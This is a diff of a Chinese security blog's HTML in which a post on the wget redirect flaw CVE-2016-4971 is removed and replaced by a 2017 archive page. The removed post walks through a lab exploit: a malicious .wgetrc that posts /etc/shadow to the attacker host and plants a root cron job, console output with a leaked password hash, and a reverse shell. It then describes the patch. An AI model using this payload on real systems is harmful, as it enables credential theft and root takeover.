@@ -6,36 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://wismartzy.github.io">
-  <title>wget 重定向漏洞（CVE-2016-4971） | Wismartzy&#39;s Blog</title>
+  <title>Archives: 2017 | Wismartzy&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="概述GNU wget 低于1.18版本均存在任意文件上传/可能还会造成远程代码执行CVE-2016-4971。当提供给wget一个恶意的url时，wget（版本低于1.18）会执行url所指向的webserver返回头中的30x跳转，造成wget会保存攻击者提供的任意远程文件。
-验证环境
-webserver 10.0.97.225/192.168.1.148
-logserver 10.0.97.2">
-<meta property="og:type" content="article">
-<meta property="og:title" content="wget 重定向漏洞（CVE-2016-4971）">
-<meta property="og:url" content="http://wismartzy.github.io/2016/07/26/wget-redirection-vulnerability/index.html">
+  <meta name="description" content="Worker Security">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Wismartzy's Blog">
+<meta property="og:url" content="http://wismartzy.github.io/archives/2017/index.html">
 <meta property="og:site_name" content="Wismartzy's Blog">
-<meta property="og:description" content="概述GNU wget 低于1.18版本均存在任意文件上传/可能还会造成远程代码执行CVE-2016-4971。当提供给wget一个恶意的url时，wget（版本低于1.18）会执行url所指向的webserver返回头中的30x跳转，造成wget会保存攻击者提供的任意远程文件。
-验证环境
-webserver 10.0.97.225/192.168.1.148
-logserver 10.0.97.2">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-2.png">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-3.png">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-1.png">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-4.png">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-5.png">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-6.png">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-7.png">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-8.png">
-<meta property="og:updated_time" content="2017-03-19T06:31:57.000Z">
+<meta property="og:description" content="Worker Security">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="wget 重定向漏洞（CVE-2016-4971）">
-<meta name="twitter:description" content="概述GNU wget 低于1.18版本均存在任意文件上传/可能还会造成远程代码执行CVE-2016-4971。当提供给wget一个恶意的url时，wget（版本低于1.18）会执行url所指向的webserver返回头中的30x跳转，造成wget会保存攻击者提供的任意远程文件。
-验证环境
-webserver 10.0.97.225/192.168.1.148
-logserver 10.0.97.2">
-<meta name="twitter:image" content="http://wismartzy.github.io/images/wget-2.png">
+<meta name="twitter:title" content="Wismartzy's Blog">
+<meta name="twitter:description" content="Worker Security">
   
     <link rel="alternative" href="/atom.xml" title="Wismartzy&#39;s Blog" type="application/atom+xml">
   
@@ -163,194 +144,60 @@ logserver 10.0.97.2">
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-wget-redirection-vulnerability" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      wget 重定向漏洞（CVE-2016-4971）
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2017" class="archive-year">2017</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2017/02/19/port-scan/" class="archive-article-date">
+  	<time datetime="2017-02-19T03:40:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-19</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2017/02/19/port-scan/">不得不说的端口扫描</a>
     </h1>
   
 
-        
-        <a href="/2016/07/26/wget-redirection-vulnerability/" class="archive-article-date">
-  	<time datetime="2016-07-26T03:55:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-07-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>GNU wget 低于1.18版本均存在任意文件上传/可能还会造成远程代码执行<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4971" target="_blank" rel="external">CVE-2016-4971</a>。当提供给wget一个恶意的url时，wget（版本低于1.18）会执行url所指向的webserver返回头中的30x跳转，造成wget会保存攻击者提供的任意远程文件。</p>
-<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><blockquote>
-<p>webserver 10.0.97.225/192.168.1.148</p>
-<p>logserver 10.0.97.243/192.168.1.149</p>
-</blockquote>
-<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>在webserver上起了个nginx，nginx.conf里配置了一个302跳转，另外还起了一个ftp服务，监听21端口，<code>python -m pyftpdlib -p21 -w</code></p>
-<p><img src="/images/wget-2.png" alt="wget-2"></p>
-<p><img src="/images/wget-3.png" alt="wget-3"></p>
-<p>logserver上wget版本信息</p>
-<a id="more"></a>
-<p><img src="/images/wget-1.png" alt="wget-1"></p>
-<p>在机器（logserver）上使用wget发起对webserver的访问，从debug信息可以看到wget在遇到30x返回码的时候是不做任何验证就去请求FTP了。</p>
-<p><img src="/images/wget-4.png" alt="wget-4"></p>
-<p>ftp的log：</p>
-<p><img src="/images/wget-5.png" alt="wget-5"></p>
-<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>webserver上的/root/.bash_profile文件就被下载到了发起wget请求的logserver上了，而wget本来是想请求下载webserver上的safe-file.txt文件的。</p>
-<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><h3 id="Cronjob"><a href="#Cronjob" class="headerlink" title="Cronjob"></a>Cronjob</h3><p>在webserver上准备好.wgetrc文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# cat .wgetrc</div><div class="line">post_file = /etc/shadow</div><div class="line">output_document = /etc/cron.d/wget-root-shell</div></pre></td></tr></table></figure>
-<p>假设现在有需求在服务器logserver上cron脚本每分钟去拉webserver的log文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*/1 * * * * root wget -N http://webserver/nginx-access.log &gt; /dev/null 2&gt;&amp;1</div></pre></td></tr></table></figure>
-<p>通过cron的日志可以看到job被执行了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Jul 13 18:54:02 logserver CROND[4161]: (root) CMD (wget -N http://webserver/safe-file.txt &gt; /dev/null 2&gt;&amp;1)</div></pre></td></tr></table></figure>
-<p>这个job是root用户执行的，所以去root家目录下查看是否已经有.wgetrc文件了</p>
-<p><img src="/images/wget-6.png" alt="wget-6"></p>
-<p>这里有点鸡肋的是如果该目录下已经存在.wgetrc文件，那么wget下载回来的.wgetrc文件将被重命名，就没法控制目标的下载行为了。</p>
-<p>既然上传了.wgetrc文件，接下来可以再深入点，反弹个shell试试：</p>
-<p>在webserver上运行exploit-db提供的exp脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# python wget_exp.py</div><div class="line">Ready? Is your FTP server running?</div><div class="line">FTP found open on 192.168.1.148:21. Let&apos;s go then</div><div class="line"></div><div class="line">Serving wget exploit on port 80...</div></pre></td></tr></table></figure>
-<p>从logserver上发起到webserver的请求，此时webserver上监听的端口开始有回显</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">We have a volunteer requesting /nginx-access.log by POST :)</div><div class="line"></div><div class="line">Received POST from wget, this should be the extracted /etc/shadow file:</div><div class="line"></div><div class="line">---[begin]---</div><div class="line"> root:$6$t8Pjy8CmXZGtsjRL$ZG.pnIDxJasLKzHA/lVR0GPlLezD1GbqVa1b3zYndE/j8jJbXbF03X8gc9AOcVkM.ZM2EYI2G7m3jCcY3QS/C.:16524:0:99999:7:::</div><div class="line">bin:*:16231:0:99999:7:::</div><div class="line">daemon:*:16231:0:99999:7:::</div><div class="line">adm:*:16231:0:99999:7:::</div><div class="line">lp:*:16231:0:99999:7:::</div><div class="line">sync:*:16231:0:99999:7:::</div><div class="line">shutdown:*:16231:0:99999:7:::</div><div class="line">halt:*:16231:0:99999:7:::</div><div class="line">mail:*:16231:0:99999:7:::</div><div class="line">operator:*:16231:0:99999:7:::</div><div class="line">games:*:16231:0:99999:7:::</div><div class="line">ftp:*:16231:0:99999:7:::</div><div class="line">nobody:*:16231:0:99999:7:::</div><div class="line">dbus:!!:16524::::::</div><div class="line">polkitd:!!:16524::::::</div><div class="line">avahi:!!:16524::::::</div><div class="line">avahi-autoipd:!!:16524::::::</div><div class="line">postfix:!!:16524::::::</div><div class="line">sshd:!!:16524::::::</div><div class="line">tcpdump:!!:16535::::::</div><div class="line">tss:!!:16545::::::</div><div class="line">user01:!!:16552:0:99999:7:::</div><div class="line">user02:!!:16553:0:99999:7:::</div><div class="line">nscd:!!:16566::::::</div><div class="line">nslcd:!!:16566::::::</div><div class="line">ntp:!!:16573::::::</div><div class="line">saslauth:!!:16575::::::</div><div class="line">mailnull:!!:16575::::::</div><div class="line">smmsp:!!:16575::::::</div><div class="line">www:!!:16653:0:99999:7:::</div><div class="line">mysql:!!:16653::::::</div><div class="line">td-agent:!!:16862::::::</div><div class="line">systemd-bus-proxy:!!:16874::::::</div><div class="line">systemd-network:!!:16874::::::</div><div class="line">unbound:!!:16874::::::</div><div class="line">ocserv:!!:16874::::::</div><div class="line">ossec:!!:16944:0:99999:7:::</div><div class="line">redis:!!:16957::::::</div><div class="line"></div><div class="line">---[eof]---</div><div class="line"></div><div class="line">Sending back a cronjob script as a thank-you for the file...</div><div class="line">It should get saved in /etc/cron.d/wget-root-shell on the victim&apos;s host (because of .wgetrc we injected in the GET first response)</div><div class="line">192.168.1.149 - - [13/Jul/2016 21:30:11] &quot;POST /nginx-access.log HTTP/1.1&quot; 200 -</div><div class="line"></div><div class="line">File was served. Check on /root/hacked-via-wget on the victim&apos;s host in a minute!</div></pre></td></tr></table></figure>
-<p>此时，在logserver上已经被写入了cron任务，每分钟执行一次的反弹shell任务</p>
-<p><img src="/images/wget-7.png" alt="wget-7"></p>
-<p>等待一分钟，cronjob执行，反弹shell成功</p>
-<p><img src="/images/wget-8.png" alt="wget-8"></p>
-<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>官方的修复方案为在调用从FTP下载文件的函数时多传了一个原始URL参数，在生成本地文件的文件名时使用了原始的URL所带的文件名，而不是使用跳转后FTP连接中的文件名了。具体修改部分可以从<a href="https://github.com/mirror/wget/commit/e996e322ffd42aaa051602da182d03178d0f13e1" target="_blank" rel="external">commit</a>上查看到。而我们用户要做的就是升级服务器上GNU wget版本至最新或1.18以上。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我发你一个链接，你敢wget吗？</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="https://www.exploit-db.com/exploits/40064/" target="_blank" rel="external">https://www.exploit-db.com/exploits/40064/</a></li>
-<li><a href="http://blog.nsfocus.net/wget-analysis-redirection-vulnerability-technology-protection-scheme/" target="_blank" rel="external">http://blog.nsfocus.net/wget-analysis-redirection-vulnerability-technology-protection-scheme/</a></li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CVE</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://wismartzy.github.io/2016/07/26/wget-redirection-vulnerability/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2016/08/21/OAuth-Security-Cheatsheet/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          OAuth Security Cheatsheet
-        
-      </div>
-    </a>
   
   
-    <a href="/2016/07/15/MySQL-Order-By-Injection/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">MySQL Order By 注入</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-
-
-
-
-  
-  <div class="duoshuo">
-	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="wget-redirection-vulnerability" data-title="wget 重定向漏洞（CVE-2016-4971）" data-url="http://wismartzy.github.io/2016/07/26/wget-redirection-vulnerability/"></div>
-	<!-- 多说评论框 end -->
-	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
-	<script type="text/javascript">
-	var duoshuoQuery = {short_name:"wismartzy"};
-	(function() {
-		var ds = document.createElement('script');
-		ds.type = 'text/javascript';ds.async = true;
-		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-		ds.charset = 'UTF-8';
-		(document.getElementsByTagName('head')[0] 
-		 || document.getElementsByTagName('body')[0]).appendChild(ds);
-	})();
-	</script>
-	<!-- 多说公共JS代码 end -->
-</div>
-
+    </div></section>
   
 
-
+    
 
 
           </div>
@@ -373,8 +220,8 @@ logserver 10.0.97.2">
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
-		isArchive: false,
+		isPost: false,
+		isArchive: true,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
